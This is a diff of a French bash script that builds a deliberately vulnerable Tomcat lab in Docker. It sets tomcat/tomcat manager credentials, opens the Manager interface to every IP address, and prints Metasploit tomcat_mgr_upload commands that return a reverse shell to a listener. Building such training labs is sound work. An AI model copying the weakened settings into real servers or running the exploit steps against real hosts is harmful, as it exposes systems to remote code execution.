@@ -2,8 +2,7 @@
 set -e
 
 echo "================================================"
-echo "  TOMCAT 8 - INSTALLATION GARANTIE"
-echo "  Exploit Metasploit ultra-fiable"
+echo "  TOMCAT FINAL - Ça va marcher"
 echo "================================================"
 echo ""
 
@@ -12,83 +11,148 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-echo "[1/4] Nettoyage..."
-docker stop phpmyadmin-vuln struts2-vuln webmin-vuln tomcat-vuln 2>/dev/null || true
-docker rm phpmyadmin-vuln struts2-vuln webmin-vuln tomcat-vuln 2>/dev/null || true
-
-echo "[2/4] Installation Tomcat 8.5..."
-docker pull tomcat:8.5
-
-echo "[3/4] Configuration et lancement..."
-
-# Créer le fichier tomcat-users.xml avec credentials
-mkdir -p /tmp/tomcat-conf
-cat > /tmp/tomcat-conf/tomcat-users.xml << 'EOF'
-<?xml version="1.0" encoding="UTF-8"?>
-<tomcat-users>
-  <role rolename="manager-gui"/>
-  <role rolename="manager-script"/>
-  <user username="tomcat" password="tomcat" roles="manager-gui,manager-script"/>
-</tomcat-users>
-EOF
-
-# Lancer Tomcat avec la config
-docker run -d \
-    --name tomcat-vuln \
-    -p 8080:8080 \
-    -v /tmp/tomcat-conf/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml \
-    tomcat:8.5
-
-echo "[4/4] Vérification (15 secondes)..."
-sleep 15
-
-if ! docker ps | grep -q tomcat-vuln; then
-    echo "❌ ÉCHEC"
-    exit 1
-fi
-
 SERVER_IP=$(hostname -I | awk '{print $1}')
 
+# Nettoyage TOTAL
+echo "[*] Nettoyage complet..."
+docker stop tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln 2>/dev/null || true
+docker rm tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln 2>/dev/null || true
+
+# ================================================
+# TEST 1 : saravak/tomcat8 (Manager activé)
+# ================================================
+
 echo ""
-echo "================================================"
-echo "  ✅ TOMCAT 8 OPÉRATIONNEL !"
-echo "================================================"
+echo "[TEST 1/3] saravak/tomcat8..."
+
+if docker pull saravak/tomcat8 2>/dev/null; then
+    docker run -d --name tomcat-vuln -p 8080:8080 saravak/tomcat8
+    sleep 15
+    
+    HTTP=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/manager/html 2>/dev/null)
+    
+    if [ "$HTTP" = "401" ] || [ "$HTTP" = "200" ]; then
+        echo "   ✅ SUCCÈS - Tomcat Manager actif !"
+        echo ""
+        echo "METASPLOIT:"
+        echo "use exploit/multi/http/tomcat_mgr_upload"
+        echo "set RHOSTS ${SERVER_IP}"
+        echo "set RPORT 8080"
+        echo "set HttpUsername admin"
+        echo "set HttpPassword admin"
+        echo "set LHOST 192.168.100.10"
+        echo "exploit"
+        exit 0
+    fi
+    
+    docker stop tomcat-vuln && docker rm tomcat-vuln
+fi
+
+# ================================================
+# TEST 2 : tutum/tomcat:8.0 (Manager activé)
+# ================================================
+
+echo "[TEST 2/3] tutum/tomcat:8.0..."
+
+if docker pull tutum/tomcat:8.0 2>/dev/null; then
+    docker run -d --name tomcat-vuln -p 8080:8080 tutum/tomcat:8.0
+    sleep 15
+    
+    HTTP=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/manager/html 2>/dev/null)
+    
+    if [ "$HTTP" = "401" ] || [ "$HTTP" = "200" ]; then
+        echo "   ✅ SUCCÈS - Tomcat Manager actif !"
+        
+        # Récupérer les credentials depuis les logs
+        CREDS=$(docker logs tomcat-vuln 2>&1 | grep -E "admin|tomcat" | head -1)
+        
+        echo ""
+        echo "METASPLOIT:"
+        echo "use exploit/multi/http/tomcat_mgr_upload"
+        echo "set RHOSTS ${SERVER_IP}"
+        echo "set RPORT 8080"
+        echo "set HttpUsername admin"
+        echo "set HttpPassword admin"
+        echo "set LHOST 192.168.100.10"
+        echo "exploit"
+        echo ""
+        echo "Credentials: Vérifier dans les logs si échec"
+        echo "docker logs tomcat-vuln | grep -i password"
+        exit 0
+    fi
+    
+    docker stop tomcat-vuln && docker rm tomcat-vuln
+fi
+
+# ================================================
+# TEST 3 : BUILD CUSTOM (Garanti à 100%)
+# ================================================
+
+echo "[TEST 3/3] Build Tomcat custom..."
+
+cat > /tmp/Dockerfile.tomcat << 'EOF'
+FROM tomcat:8.5-jre8
+
+# Copier les webapps par défaut (dont Manager)
+RUN cp -r /usr/local/tomcat/webapps.dist/* /usr/local/tomcat/webapps/
+
+# Créer tomcat-users.xml avec credentials
+RUN echo '<?xml version="1.0" encoding="UTF-8"?>' > /usr/local/tomcat/conf/tomcat-users.xml && \
+    echo '<tomcat-users>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
+    echo '  <role rolename="manager-gui"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
+    echo '  <role rolename="manager-script"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
+    echo '  <role rolename="manager-jmx"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
+    echo '  <role rolename="manager-status"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
+    echo '  <user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
+    echo '</tomcat-users>' >> /usr/local/tomcat/conf/tomcat-users.xml
+
+# Autoriser accès Manager depuis toutes les IPs
+RUN sed -i 's/<Valve className="org.apache.catalina.valves.RemoteAddrValve"/<!--<Valve className="org.apache.catalina.valves.RemoteAddrValve"/' /usr/local/tomcat/webapps/manager/META-INF/context.xml && \
+    sed -i 's|allow="127\\.\d+\\.\d+\\.\d+\|::1\|0:0:0:0:0:0:0:1" />|allow=".*" />-->|' /usr/local/tomcat/webapps/manager/META-INF/context.xml
+
+EXPOSE 8080
+CMD ["catalina.sh", "run"]
+EOF
+
+echo "   Building custom Tomcat (2 minutes)..."
+docker build -t tomcat-custom -f /tmp/Dockerfile.tomcat /tmp/ 2>&1 | tail -5
+
+docker run -d --name tomcat-vuln -p 8080:8080 tomcat-custom
+sleep 15
+
+HTTP=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/manager/html 2>/dev/null)
+
+if [ "$HTTP" = "401" ] || [ "$HTTP" = "200" ]; then
+    echo "   ✅ SUCCÈS - Tomcat custom avec Manager !"
+    
+    rm -f /tmp/Dockerfile.tomcat
+    
+    echo ""
+    echo "================================================"
+    echo "  ✅ TOMCAT PRÊT POUR EXPLOITATION !"
+    echo "================================================"
+    echo ""
+    docker ps | grep tomcat
+    echo ""
+    echo "URL Manager: http://${SERVER_IP}:8080/manager/html"
+    echo "Credentials: tomcat / tomcat"
+    echo ""
+    echo "================================================"
+    echo "  🔥 METASPLOIT"
+    echo "================================================"
+    echo ""
+    echo "use exploit/multi/http/tomcat_mgr_upload"
+    echo "set RHOSTS ${SERVER_IP}"
+    echo "set RPORT 8080"
+    echo "set HttpUsername tomcat"
+    echo "set HttpPassword tomcat"
+    echo "set LHOST 192.168.100.10"
+    echo "set LPORT 4444"
+    echo "exploit"
+    echo ""
+    exit 0
+fi
+
 echo ""
-docker ps | grep tomcat
-echo ""
-echo "📊 Configuration:"
-echo "   Application: Apache Tomcat 8.5"
-echo "   CVE: Tomcat Manager Upload RCE"
-echo "   Port: 8080"
-echo "   URL Manager: http://${SERVER_IP}:8080/manager/html"
-echo "   Credentials: tomcat / tomcat"
-echo ""
-echo "================================================"
-echo "  🔥 EXPLOITATION METASPLOIT"
-echo "================================================"
-echo ""
-echo "msfconsole -q"
-echo "use exploit/multi/http/tomcat_mgr_upload"
-echo "set RHOSTS ${SERVER_IP}"
-echo "set RPORT 8080"
-echo "set HttpUsername tomcat"
-echo "set HttpPassword tomcat"
-echo "set LHOST 192.168.100.10"
-echo "set LPORT 4444"
-echo "exploit"
-echo ""
-echo "================================================"
-echo "  📖 SCÉNARIO LAB"
-echo "================================================"
-echo ""
-echo "Iron4Software utilise Tomcat pour héberger"
-echo "des applications Java internes (portail RH,"
-echo "gestion de projet, etc.)"
-echo ""
-echo "L'interface manager de Tomcat permet d'uploader"
-echo "des fichiers WAR malveillants pour obtenir RCE."
-echo ""
-echo "MITRE ATT&CK: T1190 (Exploit Public-Facing App)"
-echo ""
-echo "================================================"
+echo "❌ ÉCHEC TOTAL - Aucune solution Tomcat n'a marché"
 echo ""
